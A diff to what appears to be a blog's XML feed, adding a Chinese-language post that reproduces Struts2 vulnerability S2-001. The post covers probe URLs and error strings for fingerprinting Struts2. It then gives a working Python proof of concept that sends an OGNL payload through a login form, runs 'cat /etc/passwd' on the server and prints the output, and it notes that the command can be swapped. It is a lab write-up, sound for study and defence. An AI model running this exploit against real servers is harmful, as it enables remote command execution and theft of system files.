@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>Struts2漏洞复现合集</title>
+      <link href="/2022/04/22/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/"/>
+      <url>/2022/04/22/Struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86/</url>
+      
+        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Apache Struts2是一个基于MVC设计模式的WEB应用框架，类似于python中的Django框架。</p><h2 id="框架的识别"><a href="#框架的识别" class="headerlink" title="框架的识别"></a>框架的识别</h2><ul><li>通过网页的后缀来进行判断，<code>.do</code>或<code>.action</code>（补充：开发者可以修改URL映射关系从而不显示后缀）</li><li>通过访问一些action路径查看报错信息：<ul><li><code>url+/?actionErrors=1111</code></li><li><code>url+/?tmp2017.action</code></li><li><code>url+/?tmp2017.do</code></li><li><code>url+/?system/index!testme.action</code></li><li><code>url+/?system/index!testme.do</code></li><li>报错信息<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> [&#x27;Struts Problem Report&#x27;,&#x27;org.apache.struts2&#x27;,&#x27;struts.devMode&#x27;,&#x27;struts-tags&#x27;,</span><br><span class="line">&#x27;There is no Action mapped for namespace&#x27;]</span><br></pre></td></tr></table></figure></li></ul></li><li>访问一个不存在的路径然后查看服务器提示信息来判断（可能返回容器默认的错误界面）</li><li>该框架一些特殊的路径<ul><li><code>url+&quot;/struts/webconsole.html&quot;</code>一个后台界面</li></ul></li><li>通过<code>CheckboxInterceptor</code>，原理是struts2的CheckBoxInterceptor拦截器会判断请求中的参数是否以<code>__checkbox_</code>开头。</li><li>更多的信息可以看这个<a href="https://github.com/coffeehb/struts2_check/blob/aad59d1678162a8f0b8ed26da829439b8eafedaa/struts2_hunt_v2.py#L16">识别工具</a></li></ul><h1 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>用户提交表单数据并且验证失败后，后端会将用户提交的表单数据使用OGNL表达式<code>%&#123;value&#125;</code>进行解析，然后重新填充到对应的表单中。比如注册和登录界面，验证失败后会默认返回之前提交的数据。<br>这样，利用后端对提交的数据进行一次OGNL表达式解析，我们可以构造payload达到命令执行的目的。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0-2.0.8</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>验证漏洞是否存在：<br>存在一个表单提交框<br><img src="https://s2.loli.net/2022/04/22/o9jGYFqMdP8xL1k.png" alt="image.png"><br>提交包含OGNL的表达式，来看看后端会不会解析<br><img src="https://s2.loli.net/2022/04/22/BePvO8NU6x7t3Sc.png" alt="image.png"><br>成功解析了我们的OGNL表达式，证明漏洞存在。<br><img src="https://s2.loli.net/2022/04/22/ZA89uGPRYmIBwjW.png" alt="image.png"><br>构造POC脚本：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    url = <span class="string">&quot;&quot;</span> </span><br><span class="line">    username = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    %&#123;</span></span><br><span class="line"><span class="string">        #a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),</span></span><br><span class="line"><span class="string">        #b=#a.getInputStream(),</span></span><br><span class="line"><span class="string">        #c=new java.io.InputStreamReader(#b),</span></span><br><span class="line"><span class="string">        #d=new java.io.BufferedReader(#c),</span></span><br><span class="line"><span class="string">        #e=new char[50000],</span></span><br><span class="line"><span class="string">        #d.read(#e),</span></span><br><span class="line"><span class="string">        #f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span></span><br><span class="line"><span class="string">        #f.getWriter().println(new java.lang.String(#e)),</span></span><br><span class="line"><span class="string">        #f.getWriter().flush(),</span></span><br><span class="line"><span class="string">        #f.getWriter().close()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    password = <span class="string">&quot;hello&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">    req = requests.post(url, data=data)</span><br><span class="line">    <span class="built_in">print</span>(req.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>其中的命令可以更改。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+          <category> Struts2 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Struts2 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CSAPP-bomblab</title>
       <link href="/2022/04/01/CSAPP-bomblab/"/>
       <url>/2022/04/01/CSAPP-bomblab/</url>
